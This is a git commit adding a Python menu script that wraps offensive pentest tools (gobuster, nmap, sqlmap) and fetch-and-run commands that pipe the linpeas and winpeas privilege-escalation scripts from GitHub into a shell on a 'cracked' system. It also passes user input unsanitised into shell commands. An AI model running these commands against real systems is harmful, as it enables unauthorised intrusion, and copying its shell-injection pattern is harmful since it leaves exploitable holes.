7c226084fd162672936867d7cdc067f6cf61a4eb
Doorman <103082286+Doormann@users.noreply.github.com>
2024-06-21 21:54:43 +0000

    new file:   BoxOfTricks.py

---
+++ BoxOfTricks.py
@@ -0,0 +1,136 @@
+import os
+import subprocess
+import platform
+
+def run_command(command):
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    out, err = process.communicate()
+    print(out.decode())
+    if err:
+        print(err.decode())
+
+def show_menu():
+    print(r"""
+         _____                                         _     
+        |  __ \                                       ( )    
+        | |  | | ___   ___  _ __ _ __ ___   __ _ _ __ |/ ___ 
+        | |  | |/ _ \ / _ \| '__| '_ ` _ \ / _` | '_ \  / __|
+        | |__| | (_) | (_) | |  | | | | | | (_| | | | | \__ \
+        |_____/ \___/ \___/|_|  |_| |_| |_|\__,_|_| |_| |___/
+                                                             
+                                                             
+         ____                     __   _______   _      _        
+        |  _ \                   / _| |__   __| (_)    | |       
+        | |_) | _____  __   ___ | |_     | |_ __ _  ___| | _____ 
+        |  _ < / _ \ \/ /  / _ \|  _|    | | '__| |/ __| |/ / __|
+        | |_) | (_) >  <  | (_) | |      | | |  | | (__|   <\__ \
+        |____/ \___/_/\_\  \___/|_|      |_|_|  |_|\___|_|\_\___/
+                                                                 
+         
+
+    1. Gobuster Directory Enumeration
+    2. Nmap Port Scan
+    3. Linpeas (Run on cracked Linux system)
+    4. Winpeas (Run on cracked Windows system)
+    5. SQLMap
+    6. Software Version Scan (Windows / Linux)
+    7. Exit
+    """)
+
+def gobuster():
+    url = input("Enter the URL to enumerate: ")
+    wordlist = input("Enter the path to the wordlist: ")
+    command = f"gobuster dir -u {url} -w {wordlist} -o gobuster_results.txt"
+    run_command(command)
+
+def nmap():
+    target = input("Enter the target IP or hostname: ")
+    command = f"nmap -p- -T4 --min-rate=1000 {target} -oN -A nmap_results.txt"
+    run_command(command)
+
+def linpeas():
+    command = "curl -Ls https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+    run_command(command)
+
+def winpeas():
+    command = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')\""
+    run_command(command)
+
+def SQLMap():
+    url = input("Target url: ")
+    command = f"sqlmap -u {url} --batch --tables --dbs"
+    run_command(command)
+    wait_for_keypress()
+
+def wait_for_keypress():
+    input("\nPress any key to return to the menu...")
+    
+
+def version_scan_linux():
+    print("Performing software version scan on Linux...")
+    commands = [
+        "uname -a",
+        "lsb_release -a",
+        "cat /etc/os-release",
+        "dpkg -l",
+        "rpm -qa",
+        "docker --version",
+        "python3 --version",
+        "java -version",
+        "gcc --version",
+        "apache2 -v",
+        "nginx -v",
+        "mysql --version",
+        "postgres --version"
+    ]
+    for command in commands:
+        print(f"\nRunning: {command}")
+        run_command(command)
+    wait_for_keypress()
+
+def version_scan_windows():
+    print("Performing software version scan on Windows...")
+    commands = [
+        "systeminfo",
+        "wmic os get Caption, Version, BuildNumber, OSArchitecture",
+        "wmic product get name, version",
+        "powershell -Command \"Get-Command java, python, docker, gcc, mysql, postgres | Select-Object Name, Version\""
+    ]
+    for command in commands:
+        print(f"\nRunning: {command}")
+        run_command(command)
+
+def version_scan():
+    system = platform.system()
+    if system == "Linux":
+        version_scan_linux()
+    elif system == "Windows":
+        version_scan_windows()
+    else:
+        print(f"Unsupported operating system: {system}")
+
+def main():
+    while True:
+        show_menu()
+        choice = input("Select an option: ")
+
+        if choice == '1':
+            gobuster()
+        elif choice == '2':
+            nmap()
+        elif choice == '3':
+            linpeas()
+        elif choice == '4':
+            winpeas()
+        elif choice == '5':
+            SQLMap()
+        elif choice == "6":
+            version_scan()
+        elif choice == '7':
+            print("Exiting...")
+            break
+        else:
+            print("Invalid option, please try again.")
+
+if __name__ == "__main__":
+    main()
